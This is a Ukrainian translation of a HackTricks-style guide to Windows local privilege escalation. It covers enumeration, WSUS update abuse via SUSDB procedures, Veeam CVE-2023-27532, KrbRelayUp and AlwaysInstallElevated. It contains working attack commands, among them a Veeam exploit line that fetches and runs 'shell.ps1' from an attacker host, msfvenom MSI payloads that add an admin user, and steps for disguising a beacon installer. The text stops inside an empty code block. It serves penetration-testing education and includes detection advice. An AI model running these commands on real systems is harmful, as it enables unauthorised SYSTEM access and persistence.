# Ескалація локальних привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локальної ескалації привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію ескалації привілеїв у Windows з кількох базових посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний порядок переліку також ґрунтується на воркшопах і контрольних списках спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичні матеріали про атаки містять презентацію DerbyCon про ескалацію привілеїв у Windows.<sup>[[5]](#references)</sup>

## Початкові відомості про Windows

### Access Tokens

**Якщо ви не знаєте, що таке access tokens у Windows, прочитайте цю сторінку, перш ніж продовжувати:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Докладніші відомості про ACLs - DACLs/SACLs/ACEs наведено на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте цю сторінку, перш ніж продовжувати:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби захисту Windows

У Windows є різні засоби, які можуть **перешкодити вам перелічити систему**, запускати виконувані файли або навіть **виявити вашу діяльність**. Перш ніж починати перерахування для ескалації привілеїв, слід **прочитати** цю **сторінку** й **перевірити** всі ці **механізми захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити редагування UEFI NVRAM в автономному режимі на ланцюжок атак із DMA до завантаження системи та зміною пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Захист адміністратора / тихе підвищення прав UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо обійти перевірки безпечного шляху AppInfo. Описаний окремий сценарій обходу UIAccess/Admin Protection наведено тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру спеціальних можливостей Secure Desktop можна використати для довільного запису до реєстру від імені SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з’явився шлях LPE через **довільний порт SMB**: привілейована локальна автентифікація NTLM відбивається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Відомості про систему

### Перелік відомостей про версію

Перевірте, чи є відома вразливість у цій версії Windows (також перевірте встановлені виправлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти для версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) стане у пригоді для пошуку докладної інформації про вразливості безпеки Microsoft. У цій базі даних понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas містить вбудований watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та можливі відповідні рекомендації з безпеки; перш ніж вважати результат застосовним, перевірте точний продукт і новіші оновлення, що замінюють попередні.

Для локального експлойта, специфічного для певної версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай відповідає 32-бітному системному каталогу, тоді як `%windir%\Sysnative` дає цьому процесу доступ до системного каталогу для нативної архітектури. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або кандидат на відсутнє оновлення KB не підтверджують, що систему можна експлуатувати; звірте поточну збірку, встановлене оновлення або новіше оновлення, що його замінює, архітектуру процесу й передумови експлойта з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) для відповідної проблеми.

Приклад пошкодження пам’яті служби див. у матеріалі про [зміщення в кільцевому буфері спільної пам’яті MIDI, контрольовані клієнтом](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Опубліковані зміщення стека стосуються лише протестованої збірки; отримання рівня `LOCAL SERVICE` — це окремий етап від подальшого [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md), що дає рівень `SYSTEM`.<sup>[[44]](#references)</sup>

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережено в змінних середовища облікові дані або якусь корисну інформацію Juicy?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли транскрипції PowerShell

Дізнатися, як увімкнути цю функцію, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або команда `Start-Transcript -OutputDirectory` може перенаправити файли до спільної або прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях виводу та ACL файлу: він може містити аргументи команд і вивід, зокрема облікові дані. Доступний для читання транскрипт є лише зачіпкою, якщо його вміст розкриває придатний до використання обліковий запис із вищими привілеями, а цей обліковий запис може увійти в систему у відповідному контексті.

### Журналювання модулів PowerShell

Записуються відомості про виконання конвеєра PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати виводу можуть не фіксуватися.

Щоб увімкнути цю функцію, дотримуйтеся вказівок у розділі документації «Файли транскриптів», вибравши **«Module Logging»** замість **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повний перебіг виконання скрипту та весь його вміст, що забезпечує документування кожного блоку коду під час виконання. Цей процес зберігає вичерпний журнал аудиту всіх дій, цінний для форензики та аналізу зловмисної поведінки. Документування всіх дій безпосередньо під час виконання дає змогу отримати докладне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Події журналювання для Script Block можна знайти в Переглядачі подій Windows за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна використати:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

У попередніх рекомендаціях ризик описано так:

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Кінцева точка WSUS через HTTP — це підстава перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати трафік або контролювати його, а також від довіри клієнта до оновлень і політики їх встановлення. Сам URL не гарантує виконання коду. [Microsoft рекомендує використовувати TLS для метаданих WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спершу перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або таке в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримали відповідь на кшталт однієї з таких:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Початкове твердження про можливість експлуатації було таким:

Тоді **це можна експлуатувати.** Якщо значення останнього розділу реєстру дорівнює `0`, запис WSUS ігноруватиметься.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану інтранет-службу. Це підтверджує одну з передумов для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення або його встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, ця конкретна кінцева точка WSUS, задана політикою, не використовується.

Щоб експлуатувати ці вразливості, можна скористатися такими інструментами, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM-скрипти для впровадження «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Дослідження доступне тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця вразливість використовує таку помилку:

> Якщо ми можемо змінити налаштування проксі для локального користувача, а Windows Updates використовує проксі, налаштований у параметрах Internet Explorer, то можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехопити власний трафік і виконати код із підвищеними привілеями в нашій системі.
>
> Крім того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо створити самопідписаний сертифікат для імені хоста WSUS і додати його до сховища сертифікатів поточного користувача, можна буде перехоплювати HTTP- і HTTPS-трафік WSUS. WSUS не використовує механізмів на кшталт HSTS для реалізації перевірки сертифіката за принципом trust-on-first-use. Якщо користувач довіряє наданому сертифікату, і він має правильне ім’я хоста, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли його оприлюднять).

### Оновлення WSUS, контрольовані адміністратором

Окремий шлях існує, коли поточний обліковий запис може **публікувати й затверджувати** оновлення на сервері WSUS. Перевірте фактичне членство в групі сервера `WSUS Administrators` та будь-які делеговані дозволи WSUS, а потім визначте групу клієнтських комп’ютерів, якій буде надіслано затверджене оновлення. [Microsoft вимагає привілеїв адміністратора WSUS для затвердження оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [описує зв’язок довіри для публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, переконайтеся, що відповідне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Саме по собі значення HTTP `WUServer` або назва групи цих умов не підтверджує.

### Зловживання користувацькими оновленнями SUSDB: непідписані payload через `.txt`/`.esd`

Це інше порушення межі довіри, а не перехоплення HTTP-з’єднання WSUS: необхідна передумова — достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)**, щоб публікувати й затверджувати користувацькі оновлення. Один із практичних способів отримати такий доступ — ретранслювати облікові дані облікового запису комп’ютера WSUS до окремого сервера MSSQL, на якому розміщено `SUSDB`; конкретні передумови залежать від розгортання, тому спочатку перевірте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, що ретранслює автентифікацію клієнта WSUS з HTTP/8530 до LDAP, SMB або AD CS, описано в розділі [Зловживання HTTP WSUS для ретрансляції NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Перевірка ретрансляції до зовнішньої бази даних і прав на процедури

Якщо WSUS використовує зовнішній SQL Server, спочатку перевірте, чи може обліковий запис сервера WSUS автентифікуватися в базі даних і чи доходить NTLM relay до цього слухача. Роль сервера SQL може надавати доступ до процедур публікації оновлень, навіть якщо прямий запис у таблиці заборонений; невдала команда `UPDATE` для `SUSDB` не доводить, що публікацію заблоковано. Перш ніж намагатися створити користувацьке оновлення, перевірте фактичний обліковий запис, членство в ролях і дозволи на процедури в авторизованому сеансі SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Визначення процедур, що працюють у реальному часі, та встановлений файл `SoftwareDistributionPackage.xsd` корисні для відтворення коректних метаданих оновлення. Батьківський bundle і дочірнє корисне навантаження мають містити `UpdateIdentity` (тип фрагмента `1`), `LocalizedProperties` (`4`) і `ExtendedProperties` (`2`); збережіть локальний ID ревізії, повернений кожним викликом `spImportUpdate`, і узгодьте зв’язок між bundle та дочірнім елементом, дайджести, розмір, URL-адресу вмісту й ревізію. Це процес публікації зі збереженням стану, тому один успішний виклик збереженої процедури не є доказом виконання на стороні клієнта.<sup>[[38]](#references)</sup>

#### Створення, націлювання та затвердження оновлення

Процес роботи з власним оновленням використовує легітимні процедури WSUS як обмежений API публікації. Важливі переходи стану:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження XML-фрагментів передумов, локалізованих і розширених властивостей | `spSaveXMLFragment` |
| Зв’язування дайджесту вмісту з URL-адресою, контрольованою зловмисником | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Затвердження встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, дайджести, розмір і обробник `CommandLineInstallation` мають узгоджуватися в імпортованих метаданих/фрагментах. Після призначення URL-адреси вмісту й цільової групи остаточне затвердження виглядає приблизно так; використовуйте нові ідентифікатори оновлення, групи та розгортання, а не повторно використовуйте GUID із прикладів.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Обхід перевірки підпису через розширення

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; у такому разі `CheckCertificateSignature` пропускається без попередньої перевірки, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt`, може пройти перевірку вмісту, а згодом бути запущеним обробником командного рядка для встановлення оновлення. Це помилка плутанини політики й типів, а не підроблення підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Підготовка та автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS завантажити зареєстрований вміст. Джерело має відповідати вимогам BITS до HTTP: самої доступності URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити з діапазонами байтів. Сервер без підтримки Range спричиняє подію синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, необхідний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для розміщення вмісту. Мінімальний приклад запуску в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без участі користувача та persistence через повторні спроби

Взаємодія на стороні клієнта залежить від політики. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, параметр `4 - Auto download and schedule install`, дає змогу завантажувати й інсталювати схвалене оновлення за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишалося невдалим/незавершеним, знову пропонувався одразу після завершення процесу callback. Тому поведінка повторних спроб може перетворитися на recurring execution persistence; це помітно, оскільки клієнт відображає стан невдалого оновлення.<sup>[[39]](#references)</sup>

#### Напрями виявлення та посилення захисту

Корисні напрями перевірки на сервері й клієнті для цього ланцюжка:<sup>[[39]](#references)</sup>

- Перевіряйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; розслідуйте появу нових груп цільового розгортання, зовнішніх джерел вмісту, payload оновлень `.txt`/`.esd` і розгортань, виконаних неочікуваними principals (особливо не обліковими записами комп’ютерів).
- Перевіряйте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте результати перевірки з розширенням payload і сигнатурою вмісту, а не покладайтеся на суфікс.
- Шукайте повторні невдалі спроби інсталяції Windows Update і повтори, а також виконання PE-файлів чи неочікувану дочірню/мережеву активність із вмісту, назви якого мають розширення `.txt` або `.esd`.
- Якщо підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте й перевіряйте права `EXECUTE` для процедур користувацького оновлення.

## Сторонні засоби автоматичного оновлення та IPC агента (local privesc)

Багато корпоративних агентів надають локальний IPC-інтерфейс і привілейований канал оновлення. Якщо можна примусити процес реєстрації звернутися до сервера зловмисника, а засіб оновлення довіряє підробленому кореневому CA або має слабкі перевірки підписувача, локальний користувач може передати шкідливий MSI, який інсталює служба SYSTEM. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Початковий опис для конкретних версій і примітка щодо розвідки:

Veeam B&R < `11.0.1.1261` відкриває локальну службу на **TCP/9401**, яка обробляє контрольовані зловмисником повідомлення, що дає змогу виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Розвідка**: перевірте наявність прослуховувача та версію, наприклад, за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication і Cloud Connect використовують основну службу резервного копіювання, яка за замовчуванням працює на **TCP/9401**. [Рекомендації Veeam](https://www.veeam.com/kb4424) описують неавтентифіковане розкриття облікових даних зашифрованої бази даних конфігурації в межах периметра мережі резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тому перевірте фактичну адресу та PID.

- **Розвідка**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані виправлень. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` є лише підказками, а не повною перевіркою встановлених виправлень.
- **Перші виправлені версії**: Veeam вказує **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені випуски; попередні випуски вразливі. Чотирикомпонентна версія файлу сама по собі не дає змоги відрізнити невиправлену базову збірку від пізнішого виправлення для тієї самої збірки. Перш ніж вважати граничну збірку виправленою, звірте ідентифікатор виправлення з [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Експлуатація**: помістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL-файлами Veeam в один каталог, а потім запустіть SYSTEM payload через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Служба виконує команду від імені SYSTEM.

У наведеному PoC показано виконання команд від імені SYSTEM за наявності додаткових передумов; у рекомендаціях постачальника описано проблему розкриття облікових даних.

## KrbRelayUp

Початковий опис поведінки за типових параметрів середовища:

У середовищах Windows **domain** за певних умов існує вразливість **підвищення локальних привілеїв**. До цих умов належать середовища, де **підписування LDAP не обов’язкове,** користувачі мають власні дозволи, які дають їм змогу налаштовувати **Resource-Based Constrained Delegation (RBCD)**, і користувачі можуть створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **типових параметрів**.

Локальна ретрансляція Kerberos може перетворити вхід із нижчими привілеями на привілейований запис у каталозі, якщо відповідний COM-сервер проходить автентифікацію, а ретрансляційний принципал має права на цільовий об’єкт. [Документація KrbRelay](https://github.com/cube0x0/KrbRelay) описує записи LDAP для RBCD і `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих сценаріїв. Ланцюжок RBCD потребує відповідних прав делегування та прав на цільовий об’єкт, а ланцюжок shadow-credential — права на запис ключових облікових даних і контролера домену, який підтримує шлях автентифікації за допомогою сертифіката. Жоден із цих шляхів не є доступним лише через членство в домені.

Перевірте фактичні політики [підписування LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [прив’язування каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) на DC, ACL об’єкта для ретрансльованої особи та рівні автентифікації й імперсонації вибраного COM-класу. Тип входу користувача та контекст облікових даних мають значення: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. На результат також можуть впливати правила брандмауера, маршрутизація OXID і встановлені оновлення. Вважайте дозвільну політику або відповідний ACL приводом для перевірки; пасивне перерахування не повинно запускати примусову автентифікацію через COM, ретрансляцію автентифікації чи записи в каталог. Shadow credential облікового запису комп’ютера може дати машинний квиток і лише за наявності в цього облікового запису потрібних прав на реплікацію каталогу — окремий шлях DCSync.

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 параметри реєстру **увімкнено** (значення — **0x1**), користувачі з будь-яким рівнем привілеїв можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сеанс meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Скористайтеся командою `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт записує попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (тому вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зверніть увагу: можна обгорнути файл «**.bat**», якщо потрібно **лише** виконати **командні рядки**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- Створіть за допомогою Cobalt Strike або Metasploit новий Windows EXE TCP payload у `C:\privesc\beacon.exe`.
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Введіть назву проєкту, наприклад **AlwaysPrivesc**, укажіть `C:\privesc` як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Натискайте **Next**, доки не дійдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно створений Beacon payload. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в розділі **Properties** змініть **TargetPlatform** з **x86** на **x64**.
  - Можна змінити й інші властивості, як-от **Author** і **Manufacturer**, щоб встановлена програма виглядала правдоподібніше.
- Клацніть проєкт правою кнопкою миші й виберіть **View > Custom Actions**.
- Клацніть **Install** правою кнопкою миші й виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить запуск Beacon payload одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що платформу встановлено на x64.

### Встановлення MSI

Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі:**

```
